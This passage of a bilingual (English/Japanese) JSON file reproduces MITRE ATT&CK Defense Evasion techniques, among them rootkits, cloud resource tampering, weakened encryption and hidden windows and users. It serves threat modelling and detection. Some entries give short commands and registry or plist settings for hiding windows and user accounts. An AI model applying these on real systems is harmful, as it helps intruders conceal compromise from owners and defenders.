        ]
    },
    {
        "id": "TA0005",
        "name_eng": "Defense Evasion",
        "name_jp": "防御回避",
        "description_eng": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",
        "description_jp": "攻撃者は検知を避けようとしています。\n\n防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。",
        "techniques": [
            {
                "id": "T1006",
                "name_eng": "Direct Volume Access",
                "name_jp": "ダイレクトボリュームアクセス",
                "description_eng": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "description_jp": "攻撃者は、ファイルアクセス制御とファイルシステム監視をバイパスするために、ボリュームに直接アクセスする可能性があります。Windowsでは、プログラムは論理ボリュームに直接アクセスできます。直接アクセス権を持つプログラムは、ファイルシステムデータ構造を分析することにより、ドライブから直接ファイルを読み書きできます。このテクニックは、Windowsファイルアクセス制御とファイルシステム監視ツールをバイパスする可能性があります。(引用: Hakobyan 2009)\n\n`NinjaCopy`などのユーティリティは、PowerShellでこれらのアクションを実行するために存在します。(引用: Github PowerSploit Ninjacopy) 攻撃者はまた、組み込みユーティリティまたはサードパーティユーティリティ（`vssadmin`、`wbadmin`、[esentutl](https://attack.mitre.org/software/S0404)など）を使用して、システムボリュームからデータのシャドウコピーまたはバックアップを作成する可能性があります。(引用: LOLBAS Esentutl)",
                "subtechniques": []
            },
            {
                "id": "T1666",
                "name_eng": "Modify Cloud Resource Hierarchy",
                "name_jp": "クラウドリソース階層の変更",
                "description_eng": "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  \n\nIaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)\n\nAdversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)\n\nIn AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)",
                "description_jp": "攻撃者は、防御を回避するために、Infrastructure-as-a-Service（IaaS）環境の階層構造を変更しようとする可能性があります。\n\nIaaS環境では、リソースを階層にグループ化することが多く、これによりリソース管理が改善され、関連するグループにポリシーを適用できます。階層構造はクラウドプロバイダーによって異なります。例えば、AWS環境では、複数のアカウントを単一の組織の下にグループ化できますが、Azure環境では、複数のサブスクリプションを単一の管理グループの下にグループ化できます。(引用: AWS Organizations)(引用: Microsoft Azure Resources)\n\n攻撃者は、IaaS階層内のリソースグループを追加、削除、またはその他の方法で変更する可能性があります。例えば、Azure環境では、グローバル管理者アカウントへのアクセスを取得した攻撃者は、リソースを展開するための新しいサブスクリプションを作成する可能性があります。また、既存の従量課金制サブスクリプションを被害者テナントから攻撃者が制御するテナントに転送することにより、サブスクリプションハイジャックを行う可能性もあります。これにより、攻撃者は被害者テナントにログを生成することなく、被害者のコンピューティングリソースを使用できます。(引用: Microsoft Peach Sandstorm 2023)(引用: Microsoft Subscription Hijacking 2022)\n\nAWS環境では、特定のアカウントで適切な権限を持つ攻撃者は、`LeaveOrganization` APIを呼び出して、アカウントを関連付けられていたAWS組織から切り離し、以前の組織によって課せられていたサービスコントロールポリシー、ガードレール、または制限を削除する可能性があります。あるいは、攻撃者は`CreateAccount` APIを呼び出して、AWS組織内に新しいアカウントを作成する可能性があります。このアカウントは支払いアカウントに登録されているのと同じ支払い方法を使用しますが、既存の検出またはサービスコントロールポリシーの対象とならない場合があります。(引用: AWS RE:Inforce Threat Detection 2024)",
                "subtechniques": []
            },
            {
                "id": "T1014",
                "name_eng": "Rootkit",
                "name_jp": "ルートキット",
                "description_eng": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "description_jp": "攻撃者はルートキットを使用して、プログラム、ファイル、ネットワーク接続、サービス、ドライバー、およびその他のシステムコンポーネントの存在を隠す可能性があります。ルートキットは、システム情報を提供するオペレーティングシステムAPI呼び出しを傍受/フックし変更することにより、マルウェアの存在を隠すプログラムです。(引用: Symantec Windows Rootkits)\n\nルートキットまたはルートキット有効化機能は、オペレーティングシステムのユーザーレベルまたはカーネルレベル、あるいはハイパーバイザー、マスターブートレコード、または[システムファームウェア](https://attack.mitre.org/techniques/T1542/001)を含むより低いレベルに存在する可能性があります。(引用: Wikipedia Rootkit) ルートキットは、Windows、Linux、およびMac OS Xシステムで見られています。(引用: CrowdStrike Linux Rootkit)(引用: BlackHat Mac OSX Rootkit)",
                "subtechniques": []
            },
            {
                "id": "T1578",
                "name_eng": "Modify Cloud Compute Infrastructure",
                "name_jp": "クラウドコンピューティングインフラストラクチャの変更",
                "description_eng": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "description_jp": "攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどの1つ以上のコンポーネントの作成、削除、または変更が含まれる場合があります。\n\nインフラストラクチャコンポーネントの変更によって得られた権限により、既存のインフラストラクチャへのアクセスを妨げる制限をバイパスできる場合があります。インフラストラクチャコンポーネントを変更すると、攻撃者は検出を回避し、その存在の証拠を削除できる可能性もあります。(引用: Mandiant M-Trends 2020)",
                "subtechniques": [
                    {
                        "id": "T1578.001",
                        "name_eng": "Create Snapshot",
                        "name_jp": "スナップショットの作成",
                        "description_eng": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",
                        "description_jp": "攻撃者は、防御を回避するために、クラウドアカウント内にスナップショットまたはデータバックアップを作成する可能性があります。スナップショットは、仮想マシン（VM）、仮想ハードドライブ、またはボリュームなどの既存のクラウドコンピューティングコンポーネントの特定時点のコピーです。攻撃者は、既存のコンピューティングサービスインフラストラクチャへのアクセスを妨げる制限をバイパスするために、スナップショットを作成する権限を利用する可能性があります。これは、攻撃者が検出を回避し、その存在の証拠を削除するためにスナップショットに戻る可能性がある[クラウドインスタンスの復元](https://attack.mitre.org/techniques/T1578/004)とは異なります。\n\n攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、作成された1つ以上のスナップショットをそのインスタンスにマウントし、その後、インバウンドおよびアウトバウンドSSHアクセスを許可するファイアウォールポリシーなど、作成されたインスタンスへの攻撃者のアクセスを許可するポリシーを適用する可能性があります。(引用: Mandiant M-Trends 2020)"
                    },
                    {
                        "id": "T1578.003",
                        "name_eng": "Delete Cloud Instance",
                        "name_jp": "クラウドインスタンスの削除",
                        "description_eng": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",
                        "description_jp": "攻撃者は、検出を回避し、その存在の証拠を削除するために、悪意のあるアクティビティを実行した後にクラウドインスタンスを削除する可能性があります。インスタンスまたは仮想マシンを削除すると、インスタンスが回復不可能な場合、貴重なフォレンジックアーティファクトやその他の疑わしい動作の証拠が削除される可能性があります。\n\n攻撃者はまた、[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、目的を達成した後にインスタンスを終了する可能性もあります。(引用: Mandiant M-Trends 2020)"
                    },
                    {
                        "id": "T1578.004",
                        "name_eng": "Revert Cloud Instance",
                        "name_jp": "クラウドインスタンスの復元",
                        "description_eng": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                        "description_jp": "攻撃者は、検出を回避し、その存在の証拠を削除するために、悪意のあるアクティビティを実行した後にクラウドインスタンスに加えられた変更を元に戻す可能性があります。クラウドベースのインフラストラクチャなどの高度に仮想化された環境では、これはクラウド管理ダッシュボードまたはクラウドAPIを介して仮想マシン（VM）またはデータストレージスナップショットを復元することによって達成される場合があります。\n\nこのテクニックの別のバリエーションは、コンピューティングインスタンスにアタッチされた一時ストレージを利用することです。ほとんどのクラウドプロバイダーは、永続的、ローカル、および/または一時的なストレージを含むさまざまな種類のストレージを提供しており、一時的なタイプはVMの停止/再起動時にリセットされることがよくあります。(引用: Tech Republic - Restore AWS Snapshots)(引用: Google - Restore Cloud Snapshot)"
                    },
                    {
                        "id": "T1578.002",
                        "name_eng": "Create Cloud Instance",
                        "name_jp": "クラウドインスタンスの作成",
                        "description_eng": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",
                        "description_jp": "攻撃者は、防御を回避するために、クラウドアカウントのコンピューティングサービス内に新しいインスタンスまたは仮想マシン（VM）を作成する可能性があります。新しいインスタンスを作成すると、攻撃者は現在アカウント内に存在するインスタンスに存在するファイアウォールルールとアクセス許可をバイパスできる可能性があります。攻撃者はアカウント内の1つ以上のボリュームの[スナップショットの作成](https://attack.mitre.org/techniques/T1578/001)を行い、新しいインスタンスを作成し、スナップショットをマウントし、その後、[ローカルシステムからのデータ](https://attack.mitre.org/techniques/T1005)を収集したり、[リモートデータステージング](https://attack.mitre.org/techniques/T1074/002)のために制限の緩いセキュリティポリシーを適用したりする可能性があります。(引用: Mandiant M-Trends 2020)\n\n新しいインスタンスを作成すると、攻撃者は現在実行中のインスタンスの実行に影響を与えることなく、環境内で悪意のあるアクティビティを実行できる可能性もあります。"
                    },
                    {
                        "id": "T1578.005",
                        "name_eng": "Modify Cloud Compute Configurations",
                        "name_jp": "クラウドコンピューティング構成の変更",
                        "description_eng": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim’s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535).",
                        "description_jp": "攻撃者は、防御を回避するために、クラウドコンピューティングインフラストラクチャで利用可能なサイズ、場所、リソースに直接影響を与える設定を変更する可能性があります。これらの設定には、サービス割り当て、サブスクリプションの関連付け、テナント全体のポリシー、または利用可能なコンピューティングに影響を与えるその他の構成が含まれる場合があります。このような変更により、攻撃者は被害者のコンピューティングリソースを悪用して目標を達成できるようになる可能性があり、実行中のインスタンスの実行に影響を与えたり、被害者にその活動を明らかにしたりすることなく行われる可能性があります。\n\n例えば、クラウドプロバイダーはしばしば割り当てを介して顧客のコンピューティングリソースの使用を制限します。顧客は、コンピューティングニーズの増加をサポートするためにこれらの割り当ての調整を要求できますが、これらの調整にはクラウドプロバイダーからの承認が必要になる場合があります。クラウド環境を侵害した攻撃者は、被害者の割り当て全体を使い果たすことによって疑いを招くことなく、追加の[リソースハイジャック](https://attack.mitre.org/techniques/T1496)を有効にするなど、その活動をサポートするために同様に割り当て調整を要求する可能性があります。(引用: Microsoft Cryptojacking 2023) 攻撃者はまた、展開された仮想マシンのサイズを制限するテナント全体のポリシーを変更することにより、許可されるリソース使用量を増やす可能性があります。(引用: Microsoft Azure Policy)\n\n攻撃者はまた、[未使用/未サポートのクラウドリージョン](https://attack.mitre.org/techniques/T1535)を有効にするなど、クラウドリソースを展開できる場所に影響を与える設定を変更する可能性もあります。"
                    }
                ]
            },
            {
                "id": "T1600",
                "name_eng": "Weaken Encryption",
                "name_jp": "暗号化の弱体化",
                "description_eng": "Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "description_jp": "攻撃者は、データ通信を保護するはずの暗号化をバイパスするために、ネットワークデバイスの暗号化機能を侵害する可能性があります。(引用: Cisco Synful Knock Evolution)\n\n暗号化は、送信されるネットワークトラフィックを保護して、その機密性（不正な開示からの保護）と完全性（不正な変更からの保護）を維持するために使用できます。暗号化暗号は、平文メッセージを暗号文に変換するために使用され、関連する復号鍵なしで解読するには計算量が多くなる可能性があります。通常、鍵が長いほど、暗号解読（鍵なしの復号）のコストが増加します。\n\n攻撃者は、ネットワークトラフィックの暗号化を実行するデバイスを侵害して操作できます。例えば、[システムイメージの変更](https://attack.mitre.org/techniques/T1601)、[鍵空間の削減](https://attack.mitre.org/techniques/T1600/001)、[暗号化ハードウェアの無効化](https://attack.mitre.org/techniques/T1600/002)などの動作を通じて、攻撃者はデバイスがネットワークトラフィックを安全に暗号化する能力に悪影響を与えたり、排除したりすることができます。これにより、不正な開示のリスクが高まり、データ操作、認証情報アクセス、または収集の取り組みが容易になる可能性があります。(引用: Cisco Blog Legacy Device Attacks)",
                "subtechniques": [
                    {
                        "id": "T1600.001",
                        "name_eng": "Reduce Key Space",
                        "name_jp": "鍵空間の削減",
                        "description_eng": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "攻撃者は、暗号化された通信の暗号強度を低下させることにより、ネットワーク経由で送信されるデータを復号するために必要な労力のレベルを低減する可能性があります。(引用: Cisco Synful Knock Evolution)\n\n攻撃者は、ソフトウェアが平文を暗号文に変換するために使用する鍵サイズを（例えば、数百または数千バイトからわずか数バイトに）削減することにより、侵害されたネットワークデバイス上の暗号化ソフトウェアを弱体化させることができます。その結果、攻撃者は鍵なしで保護された情報を復号するために必要な労力を劇的に削減します。\n\n攻撃者は、[システムイメージの変更](https://attack.mitre.org/techniques/T1601)を通じてシステムに導入された[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)の特殊なコマンドを使用して、使用される鍵サイズやその他の暗号化パラメータを変更し、デバイスの構成を変更する可能性があります。(引用: Cisco Blog Legacy Device Attacks)"
                    },
                    {
                        "id": "T1600.002",
                        "name_eng": "Disable Crypto Hardware",
                        "name_jp": "暗号化ハードウェアの無効化",
                        "description_eng": "Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "攻撃者はネットワークデバイスの専用ハードウェア暗号化を無効にし、ソフトウェア暗号化の弱点を利用して、送信データの収集、操作、および持ち出しに関わる労力を削減する可能性があります。\n\nルーター、スイッチ、ファイアウォールなどの多くのネットワークデバイスは、ネットワーク全体の安全な送信のためにネットワークトラフィックの暗号化を実行します。多くの場合、これらのデバイスには、暗号化プロセスの速度を大幅に向上させ、悪意のある改ざんを防ぐための特別な専用暗号化ハードウェアが装備されています。攻撃者がそのようなデバイスを制御すると、例えば[システムイメージの変更](https://attack.mitre.org/techniques/T1601)を使用して専用ハードウェアを無効にし、汎用プロセッサで暗号化を実行するためにソフトウェアの使用を強制する可能性があります。これは通常、ソフトウェアの暗号強度を弱める攻撃（例えば、[鍵空間の削減](https://attack.mitre.org/techniques/T1600/001)）と組み合わせて使用されます。(引用: Cisco Blog Legacy Device Attacks)"
                    }
                ]
            },
            {
                "id": "T1564",
                "name_eng": "Hide Artifacts",
                "name_jp": "アーティファクトの隠蔽",
                "description_eng": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
                "description_jp": "攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)\n\n攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)",
                "subtechniques": [
                    {
                        "id": "T1564.003",
                        "name_eng": "Hidden Window",
                        "name_jp": "隠しウィンドウ",
                        "description_eng": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)\n\nThe Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing)\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.",
                        "description_jp": "攻撃者は、ユーザーの目から悪意のあるアクティビティを隠すために隠しウィンドウを使用する可能性があります。場合によっては、アプリケーションが操作を実行するときに通常表示されるウィンドウを非表示にすることができます。これは、管理タスクを実行するときにユーザーの作業環境を妨害しないようにするためにシステム管理者が利用する場合があります。\n\n攻撃者はこれらの機能を悪用して、システム上の攻撃者のアクティビティをユーザーに警告しないように、他の方法では表示されるウィンドウをユーザーから隠す可能性があります。(引用: Antiquated Mac Malware)\n\nmacOSでは、アプリケーションの実行方法に関する構成はプロパティリスト（plist）ファイルにリストされています。これらのファイルのタグの1つに<code>apple.awt.UIElement</code>があり、これによりJavaアプリケーションはアプリケーションのアイコンがDockに表示されるのを防ぐことができます。これの一般的な使用法は、アプリケーションがシステムトレイで実行されるが、Dockにも表示されたくない場合です。\n\n同様に、Windowsには、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、Jscript、[Visual Basic](https://attack.mitre.org/techniques/T1059/005)などのスクリプト言語に、ウィンドウを非表示にするためのさまざまな機能があります。この一例は、<code>powershell.exe -WindowStyle Hidden</code>です。(引用: PowerShell About 2019)\n\nWindowsレジストリを編集して、現在のユーザーからアプリケーションウィンドウを非表示にすることもできます。例えば、`HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe`レジストリキーの`WindowPosition`サブキーを最大値に設定することにより、PowerShellウィンドウは画面外で開き、非表示になります。(引用: Cantoris Computing)\n\nさらに、Windowsは、独自の対応する<code>explorer.exe</code>プロセスを持つ非表示のデスクトップウィンドウを作成できる`CreateDesktop()` APIをサポートしています。(引用: Hidden VNC)(引用: Anatomy of an hVNC Attack) 非表示のVNC（hVNC）セッションなど、非表示のデスクトップウィンドウで実行されているすべてのアプリケーションは、他のデスクトップウィンドウからは見えません。"
                    },
                    {
                        "id": "T1564.011",
                        "name_eng": "Ignore Process Interrupts",
                        "name_jp": "プロセス割り込みの無視",
                        "description_eng": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.",
                        "description_jp": "攻撃者は、プロセス割り込み信号から隠れるコマンドを実行することで、防御メカニズムを回避する可能性があります。多くのオペレーティングシステムは、プロセス動作を制御するためのメッセージを配信するために信号を使用します。コマンドインタプリタには、アクティブセッションのユーザーがログオフしたときなど、エラーやその他のハングアップを無視する特定のコマンド/フラグが含まれていることがよくあります。(引用: Linux Signal Man) これらの割り込み信号は、指定された実行中のプロセスを一時停止または終了させるために、防御ツールやアナリストによって使用される場合もあります。\n\n攻撃者は、`nohup`、[PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`、またはハングアップの影響を受けない可能性のある同様のコマンドを使用してプロセスを呼び出す可能性があります。(引用: nohup Linux Man)(引用: Microsoft PowerShell SilentlyContinue) これにより、ユーザーのログオフやC2ネットワーク接続の終了など、通常は実行を終了させるシステムイベントを通じて、悪意のあるコマンドやマルウェアが実行を継続できるようになる可能性があります。\n\nプロセス割り込み信号から隠れることでマルウェアは実行を継続できますが、[トラップ](https://attack.mitre.org/techniques/T1546/005)とは異なり、プロセスが実際に終了されると再呼び出しされないため、[永続性](https://attack.mitre.org/tactics/TA0003)は確立されません。"
                    },
                    {
                        "id": "T1564.002",
                        "name_eng": "Hidden Users",
                        "name_jp": "隠しユーザー",
                        "description_eng": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific 